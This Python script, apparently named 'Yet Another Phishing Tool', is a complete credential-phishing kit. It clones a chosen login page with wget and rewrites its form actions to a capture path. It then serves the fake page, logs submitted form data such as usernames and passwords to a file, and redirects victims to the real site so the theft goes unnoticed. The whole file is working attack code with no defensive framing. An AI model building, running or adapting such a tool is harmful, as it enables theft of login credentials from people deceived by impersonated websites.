import os
import http.server
import socketserver
import re
import sys
import argparse
from urllib.parse import urlparse
from datetime import datetime
import shutil
from colorama import init, Fore, Style

init(autoreset=True)

####################
###   CONSTANTS  ###
####################

BANNER = f'''
  {Fore.GREEN}
_____.___.  _____ __________.__    ._____________
\__  |   | /  _  \\______   \  |__ |__\__    ___/
 /   |   |/  /_\  \|     ___/  |  \|  | |    |   
 \____   /    |    \    |   |   Y  \  | |    |   
 / ______\____|__  /____|   |___|  /__| |____|   
 \/              \/              \/              
            Yet Another Phishing Tool
                                    by DarkSolo
                {Style.RESET_ALL}
'''
DEFAULT_USER_AGENT = "\"Mozilla/5.0 (X11; Linux; x64; rv:99.0) Gecko/20100101 Firefox/99.0\""

#########################
###   ARGUMENT PARSER  ###
#########################

parser = argparse.ArgumentParser(
    description=f'{Fore.CYAN}Clone login page and launch webserver.{Style.RESET_ALL}',
    epilog=f'{Fore.YELLOW}Example usage:{Style.RESET_ALL} python3 yaphit.py --url "http://example.com" --port 8080',
    formatter_class=argparse.ArgumentDefaultsHelpFormatter
)
parser.add_argument('--port', type=int, default=80, help='Port to start the HTTP server on.')
parser.add_argument('--url', type=str, help='URL to download with wget (required unless --clear is specified).')
parser.add_argument('--user_agent', type=str, default=DEFAULT_USER_AGENT, help='Custom user agent for the wget request.')
parser.add_argument('--redirect_ip', type=str, help='IP/domain to forward GET/POST requests to. Default: the URL provided.')
parser.add_argument('--clear', action='store_true', help='Clear the "site" directory before launch this script again.')

args = parser.parse_args()

if args.clear:
    if os.path.exists('site'):
        print(f"{Fore.YELLOW}[*] Clearing the site directory...{Style.RESET_ALL}")
        shutil.rmtree('site')
        print(f"{Fore.GREEN}[*] Site directory cleared.{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[!] The site directory does not exist. Nothing to clear.{Style.RESET_ALL}")
    sys.exit(0)

if os.path.exists('site') and os.listdir('site'):
    print(f"{Fore.RED}[!] The 'site' directory is not empty. Please clear it with --clear before proceeding.{Style.RESET_ALL}")
    sys.exit(1)

if not args.url:
    print(f"{Fore.RED}[!] --url is required unless --clear is used.{Style.RESET_ALL}")
    sys.exit(1)

redirect_ip = args.redirect_ip if args.redirect_ip else args.url

parsed_url = urlparse(args.url)
domain = parsed_url.netloc if parsed_url.netloc else "unknown_domain"

current_date = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
POSTS_DIR = os.path.join(os.getcwd(), 'posts')
POST_PATH = os.path.join(POSTS_DIR, f"post_{domain}_{current_date}.txt")

CURRENT_PATH = os.getcwd()
SITE_PATH = os.path.join(CURRENT_PATH, 'site')
INDEX_PATH = os.path.join(SITE_PATH, 'index.html')

if not os.path.exists(POSTS_DIR):
    os.makedirs(POSTS_DIR)

############################
###   INPUT & WEB CRAWL  ###
############################

os.system("clear")
print(BANNER)

print(f"\n{Fore.CYAN}[*] Downloading web page with wget ...{Style.RESET_ALL}")
os.system(f"wget -E -H -k -K -p -nH --cut-dirs=100 -nv {args.url} --user-agent {args.user_agent} --directory-prefix={SITE_PATH}")
print(f"{Fore.GREEN}[*] Done.{Style.RESET_ALL}\n")

if not os.path.isfile(INDEX_PATH):
    html_files_in_site = [file for file in os.listdir(SITE_PATH) if file.endswith(".html") or file.endswith(".htm")]
    
    if len(html_files_in_site) == 1:
        os.rename(os.path.join(SITE_PATH, html_files_in_site[0]), INDEX_PATH)
    else:
        index_filename = input(f"{Fore.YELLOW}[?] Which file in /site should be used as index.html? (filename only):{Style.RESET_ALL} ")
        print(f"\n{Fore.CYAN}[*] Renaming file ...{Style.RESET_ALL}")
        os.rename(os.path.join(SITE_PATH, index_filename), INDEX_PATH)
        print(f"{Fore.GREEN}[*] Done.{Style.RESET_ALL}\n")

#########################
###  EDIT HTML FORMS  ###
#########################

print(f"\n{Fore.CYAN}[*] Editing HTML index file ...{Style.RESET_ALL}")

html_as_str = open(INDEX_PATH, 'r').read()
forms_pattern = '(<form[^>]*?action=")([^"]*)("[^>]*>)'
html_as_str = re.sub(forms_pattern, r'\1\\custom_path_for_form_post_requests\3', html_as_str)

with open(INDEX_PATH, 'wb') as file:
    file.write(str.encode(html_as_str))

print(f"{Fore.GREEN}[*] Done.{Style.RESET_ALL}")

input(f"\n{Fore.YELLOW}[*] Press ENTER to start the HTTP server ...{Style.RESET_ALL}")

######################
###   HTTP Server  ###
######################

class SimpleHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print(f"{Fore.CYAN}[*] GET request received!{Style.RESET_ALL}")

        if os.path.exists(self.translate_path(self.path)):
            f = self.send_head()
            if f:
                self.copyfile(f, self.wfile)
                f.close()
        else:
            print(f"{Fore.RED}[*] Error : File {self.path} is non-existent!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Returning HTTP 303 response code ...{Style.RESET_ALL}")   
            remote_path = "{}/{}".format(redirect_ip, self.path)
            self.send_response(303)
            self.send_header("Location", remote_path)
            self.end_headers() 

    def do_POST(self):
        print(f"{Fore.CYAN}[*] POST request received!{Style.RESET_ALL}")
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        
        # Stampa i dati ricevuti nel terminale
        print(f"{Fore.YELLOW}[+] Data received:{Style.RESET_ALL}")
        print(body.decode("utf-8"))
        
        if self.path == "/custom_path_for_form_post_requests":
            print(f"{Fore.GREEN}[+] Form was filled! Writing output to post file ...{Style.RESET_ALL}")
            self.send_response(303)
            self.send_header("Location", redirect_ip)
            with open(POST_PATH, 'a+') as file:
                file.write(body.decode("utf-8"))
                file.write("\n\n")
        else:
            self.send_response(308)
            self.send_header("Location", "{}/{}".format(redirect_ip, self.path))
        
        self.end_headers()

    def log_message(self, format, *args):
        return

def launch_server(port):
    os.chdir(SITE_PATH)
    httpd = socketserver.TCPServer(("", port), SimpleHTTPRequestHandler)

    try:
        print(f"{Fore.CYAN}[*] Serving HTTP at port {port}.{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}[!] Use CTRL+C to exit and close the HTTP server.{Style.RESET_ALL}")
        httpd.serve_forever()
    except KeyboardInterrupt:
        print(f"{Fore.RED}[!] KeyboardInterrupt{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Closing HTTP server ...{Style.RESET_ALL}")
        httpd.server_close()
        print(f"{Fore.RED}[!] Please run --clear before you run this script again!{Style.RESET_ALL}")

print(f"\n{Fore.CYAN}[*] Launching HTTP server ...{Style.RESET_ALL}")
launch_server(args.port)
